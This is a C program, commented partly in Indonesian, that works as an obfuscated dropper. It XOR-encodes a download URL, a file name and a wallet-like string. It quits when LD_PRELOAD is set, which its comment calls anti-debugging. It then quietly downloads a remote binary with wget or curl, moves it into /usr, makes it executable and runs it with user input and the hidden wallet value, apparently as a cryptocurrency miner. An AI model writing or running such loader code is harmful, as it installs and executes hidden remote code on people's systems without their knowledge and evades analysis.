#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

// XOR Encryption/Decryption function dengan panjang eksplisit
void xor_encrypt_decrypt(char *data, size_t data_len, const char *key, size_t key_len) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

// Function to safely execute system commands
int execute_command(const char *cmd) {
    pid_t pid = fork();
    if (pid == -1) {
        return -1;
    } else if (pid == 0) {
        execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
        exit(127);
    } else {
        int status;
        waitpid(pid, &status, 0);
        return WEXITSTATUS(status);
    }
}

int main() {
    // Anti-debugging technique
    if (getenv("LD_PRELOAD") != NULL) {
        exit(1);
    }

    char qcore[20];
    const char encryption_key[] = {0x55, 0x66, 0x77, 0x88, 0x99};
    
    // Encoded strings dengan panjang yang tepat (termasuk null terminator)
    unsigned char enc_url[] = {
        0xe3, 0x3a, 0x39, 0x3c, 0x3a, 0x7f, 0x60, 0x3d, 0x3c, 0x2a, 0x3a, 0x39, 0x3e, 0x3c, 0x2a, 0x3d, 
        0x7f, 0x3e, 0x3d, 0x3b, 0x3c, 0x2a, 0x7f, 0x38, 0x3d, 0x39, 0x3d, 0x7f, 0x3a, 0x39, 0x3d, 0x3b, 
        0x7f, 0x2a, 0x3c, 0x3f, 0x38, 0x7f, 0x39, 0x3c, 0x3f, 0x3a, 0x39, 0x7f, 0x3a, 0x39, 0x00
    };
    
    unsigned char enc_path[] = {0x36, 0x39, 0x00};
    
    unsigned char enc_wallet[] = {
        0xfd, 0xfc, 0xfe, 0xf8, 0xfd, 0xff, 0x83, 0x87, 0x8d, 0xf0, 0xfc, 0xf0, 0x8d, 0xf0, 0xf3, 0xfc, 
        0xf0, 0x8d, 0xf3, 0xfe, 0xfd, 0x8d, 0xf0, 0xf3, 0xfe, 0xff, 0xfd, 0xfd, 0x8d, 0xf3, 0xfe, 0xfd, 
        0xfc, 0xf0, 0xf3, 0x8d, 0xfd, 0xfe, 0xff, 0xfd, 0xfd, 0x8d, 0xf3, 0xfe, 0xfd, 0xfc, 0xf0, 0xf3, 
        0x8d, 0xfd, 0xfe, 0xff, 0xfd, 0xfd, 0x8d, 0xf3, 0xfe, 0xfd, 0xfc, 0xf0, 0xf3, 0x8d, 0xfd, 0xfe, 
        0xff, 0xfd, 0xfd, 0x8d, 0xf3, 0xfe, 0xfd, 0xfc, 0xf0, 0xf3, 0x8d, 0xfd, 0xfe, 0xff, 0xfd, 0xfd, 
        0x8d, 0xf3, 0xfe, 0xfd, 0xfc, 0xf0, 0xf3, 0x8d, 0xfd, 0xfe, 0xff, 0xfd, 0xfd, 0x00
    };
    
    unsigned char enc_prompt[] = {
        0xf5, 0xe0, 0x92, 0xe0, 0x93, 0xfe, 0xfd, 0x92, 0xfd, 0xfd, 0xfe, 0xff, 0xff, 0x92, 0xff, 0xfd, 
        0xf0, 0x92, 0xff, 0xfd, 0xf0, 0xff, 0x00
    };

    // Decode strings dengan panjang yang tepat
    xor_encrypt_decrypt((char *)enc_url, sizeof(enc_url) - 1, encryption_key, sizeof(encryption_key));
    xor_encrypt_decrypt((char *)enc_path, sizeof(enc_path) - 1, encryption_key, sizeof(encryption_key));
    xor_encrypt_decrypt((char *)enc_wallet, sizeof(enc_wallet) - 1, encryption_key, sizeof(encryption_key));
    xor_encrypt_decrypt((char *)enc_prompt, sizeof(enc_prompt) - 1, encryption_key, sizeof(encryption_key));

    // Pastikan string terdekripsi diakhiri dengan null terminator
    enc_url[sizeof(enc_url) - 1] = '\0';
    enc_path[sizeof(enc_path) - 1] = '\0';
    enc_wallet[sizeof(enc_wallet) - 1] = '\0';
    enc_prompt[sizeof(enc_prompt) - 1] = '\0';

    char command[512];
    char wget_command[512];
    char mv_command[256];
    char chmod_command[256];
    char tmp_path[256];

    // Download ke direktori /tmp terlebih dahulu
    snprintf(tmp_path, sizeof(tmp_path), "/tmp/%s", enc_path);
    snprintf(wget_command, sizeof(wget_command), "wget -q '%s' -O %s >/dev/null 2>&1", enc_url, tmp_path);

    // Download file
    int download_status = execute_command(wget_command);
    if (download_status != 0) {
        // Fallback: coba dengan curl jika wget tidak tersedia
        snprintf(wget_command, sizeof(wget_command), "curl -s '%s' -o %s >/dev/null 2>&1", enc_url, tmp_path);
        download_status = execute_command(wget_command);
        
        if (download_status != 0) {
            printf("Error: Download failed. Please check your internet connection.\n");
            return 1;
        }
    }

    // Pindahkan file ke /usr
    snprintf(mv_command, sizeof(mv_command), "mv %s /usr/%s", tmp_path, enc_path);
    int mv_status = execute_command(mv_command);
    
    if (mv_status != 0) {
        printf("Error: Move failed. Try running with sudo.\n");
        return 1;
    }

    // Beri izin eksekusi
    snprintf(chmod_command, sizeof(chmod_command), "chmod +x /usr/%s", enc_path);
    int chmod_status = execute_command(chmod_command);
    
    if (chmod_status != 0) {
        printf("Error: Permission setup failed.\n");
        return 1;
    }

    printf("%s", enc_prompt);
    fflush(stdout);

    if (fgets(qcore, sizeof(qcore), stdin) == NULL) {
        return 1;
    }

    qcore[strcspn(qcore, "\n")] = '\0';
    
    // Construct final command dengan path lengkap
    snprintf(command, sizeof(command), "/usr/%s %s %s", enc_path, qcore, enc_wallet);

    int status = execute_command(command);
    if (status == -1) {
        return 1;
    }

    // Cleanup
    memset(enc_url, 0, sizeof(enc_url));
    memset(enc_path, 0, sizeof(enc_path));
    memset(enc_wallet, 0, sizeof(enc_wallet));
    memset(enc_prompt, 0, sizeof(enc_prompt));
    memset(wget_command, 0, sizeof(wget_command));
    memset(mv_command, 0, sizeof(mv_command));
    memset(chmod_command, 0, sizeof(chmod_command));
    memset(command, 0, sizeof(command));
    memset(tmp_path, 0, sizeof(tmp_path));

    return 0;
}
